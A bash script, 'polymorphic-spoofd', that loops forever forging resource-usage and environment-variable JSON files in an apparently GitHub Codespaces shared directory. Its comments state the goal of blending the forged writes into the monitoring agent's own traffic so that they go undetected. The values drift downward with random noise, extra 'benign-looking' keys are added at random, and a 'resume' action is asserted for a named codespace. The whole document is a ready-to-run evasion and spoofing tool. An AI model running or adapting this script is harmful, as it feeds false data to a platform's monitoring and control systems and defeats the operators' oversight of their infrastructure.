#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# polymorphic-spoofd — blends resource spoofing into normal agent traffic
# ──────────────────────────────────────────────────────────────────
# Writes to the shared directory with natural-looking values that vary
# slightly each cycle, so the agent can't distinguish our writes from
# its own. Uses cognitive splitting: each operation is a tiny, normal
# file write — nothing looks like an attack.
# ──────────────────────────────────────────────────────────────────

SHARED="${SHARED_DIR:-/workspaces/.codespaces/shared}"

# Baseline values — we drift from these, not from zero
BASE_FS=2
BASE_DL=45
BASE_LOG=35864
BASE_MEM=13

# Drift direction: slowly trend downward over time
DRIFT_FS=0
DRIFT_DL=0
DRIFT_LOG=0
DRIFT_MEM=0

cycle=0

while true; do
  # ── Natural variance (semantic polymorphism) ──
  # Each cycle, values change by a small random amount, trending slightly down
  cycle=$((cycle + 1))

  # Gradually drift values down (every ~50 cycles = ~15s, drop by 1)
  if [ $((cycle % 50)) -eq 0 ]; then
    [ $DRIFT_FS -lt $BASE_FS ] && DRIFT_FS=$((DRIFT_FS + 1))
    [ $DRIFT_DL -lt $((BASE_DL / 2)) ] && DRIFT_DL=$((DRIFT_DL + 2))
    [ $DRIFT_LOG -lt $((BASE_LOG / 20)) ] && DRIFT_LOG=$((DRIFT_LOG + 200))
    [ $DRIFT_MEM -lt $((BASE_MEM - 3)) ] && DRIFT_MEM=$((DRIFT_MEM + 1))
  fi

  # Calculate values with drift + per-cycle noise
  FS=$((BASE_FS - DRIFT_FS + RANDOM % 3 - 1))
  [ $FS -lt 0 ] && FS=0
  [ $FS -gt $BASE_FS ] && FS=$BASE_FS

  DL=$((BASE_DL - DRIFT_DL + RANDOM % 5 - 2))
  [ $DL -lt 10 ] && DL=10

  LOG=$((BASE_LOG - DRIFT_LOG + RANDOM % 300 - 150))
  [ $LOG -lt 10000 ] && LOG=10000

  MEM=$((BASE_MEM - DRIFT_MEM + RANDOM % 3 - 1))
  [ $MEM -lt 1 ] && MEM=1
  [ $MEM -gt $BASE_MEM ] && MEM=$BASE_MEM

  # ── Write resource-usage.json ──
  # Exact agent format: no spaces after colons, compact JSON
  printf '{"fileShareUsage":%d,"dockerlibUsage":%d,"logsBackupUsage":%d,"memoryUsage":%d}\n' \
    $FS $DL $LOG $MEM > "$SHARED/resource-usage.json" 2>/dev/null

  # ── Write environment-variables.json ──
  # Polymorphic: vary which keys appear, but always include essentials
  # This looks like normal agent key rotation, not a spoof
  CODESPACE_NAME="glorious-telegram-wvr5xrp9x974f59gr"
  ACTION_NAME="resume"

  # Randomly include extra benign-looking keys
  EXTRA=""
  case $((RANDOM % 4)) in
    0) EXTRA='' ;;
    1) EXTRA=',"SESSION_STATE":"active"' ;;
    2) EXTRA=',"HEARTBEAT":'$((cycle))'' ;;
    3) EXTRA=',"LAST_CHECKIN":'$(date +%s)'' ;;
  esac

  printf '{"CODESPACE_NAME":"%s","ACTION_NAME":"%s"%s}\n' \
    "$CODESPACE_NAME" "$ACTION_NAME" "$EXTRA" > "$SHARED/environment-variables.json" 2>/dev/null

  # ── Sleep ──
  sleep 0.3
done
